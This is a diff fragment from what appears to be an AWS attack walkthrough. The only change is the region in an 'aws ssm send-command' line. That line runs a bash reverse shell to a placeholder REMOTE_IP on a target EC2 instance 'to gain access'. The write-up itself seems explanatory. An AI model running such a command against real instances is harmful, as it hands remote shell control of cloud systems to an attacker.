@@ -234,7 +234,7 @@ aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId, Ta
 
 Found one that looks interesting. Let’s gain access (create new listener, with another port):
 ```bash
-aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0d76444a40c11c1bf" --parameters "commands=['bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1']" --region us-west-1
+aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0d76444a40c11c1bf" --parameters "commands=['bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1']" --region us-east-1
 ```
 ![image](https://github.com/user-attachments/assets/162a99c3-0810-4a43-9baf-a2342491c6f5)
 
